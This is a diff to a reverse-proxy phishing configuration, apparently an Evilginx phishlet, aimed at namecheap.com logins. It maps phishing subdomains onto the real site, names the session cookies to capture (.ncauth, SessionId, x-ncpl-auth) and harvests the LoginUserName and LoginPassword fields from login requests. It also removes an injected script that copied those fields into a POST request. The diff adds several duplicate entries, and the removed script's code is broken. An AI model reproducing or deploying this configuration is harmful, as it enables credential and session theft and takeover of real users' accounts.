@@ -4,6 +4,9 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'namecheap.com', session: true, is_landing: true}
   - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+  - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+  - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+  - {phish_sub: 'ap', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
 
 sub_filters:
   - {triggers_on: 'www.namecheap.com', orig_sub: 'www', domain: 'namecheap.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -12,42 +15,31 @@ sub_filters:
 
 auth_tokens:
   - domain: 'ap.www.namecheap.com'
-    keys: ['.*,regexp']  
-auth_urls:
-  - ''  
+    keys: ['.ncauth, rdt_uuid, SessionId, x-ncpl-auth, x-sf-country']  
 credentials:
   username:
-    key: 'leaked_username'
+    key: 'LoginUserName'
     search: '(.*)'
     type: 'post'
   password:
-    key: 'leaked_password'
+    key: 'LoginPassword'
     search: '(.*)'
     type: 'post'
+  custom:
+    - key: 'LoginUserName'
+      search: '(.*)'
+      type: 'post'
+    - key: 'LoginUserName'
+      search: '(.*)'
+      type: 'post'
+    - key: 'LoginPassword'
+      search: '(.*)'
+      type: 'post'
+    - key: 'LoginPassword'
+      search: '(.*)'
+      type: 'post'      
+      
 login:
   domain: 'www.namecheap.com'
   path: '/myaccount/login/' 
   
-js_inject:
-  - trigger_domains: ["www.namecheap.com"]
-    trigger_paths: ["/myaccount"]
-    trigger_params: []
-    script: |
-      function lp(){
-        var submit = document.querySelectorAll('button[type=submit]')[0];
-        submit.addEventListener("onclick", sendPass(), false);
-        submit.addEventListener("onclick", return validateLogin(), false);
-        return;
-      }
-      
-      function sendPass(){
-        var password = document.getElementsByName("LoginPassword")[0].value;
-        var username = document.getElementsByName("LoginUserName")[0].value;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/myaccount/signout/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("leaked_username="+encodeURIComponent(username), "leaked_password="+encodeURIComponent(password));
-        xhr.send();
-        return;
-      }
-      setTimeout(function(){ lp(); }, 2000);
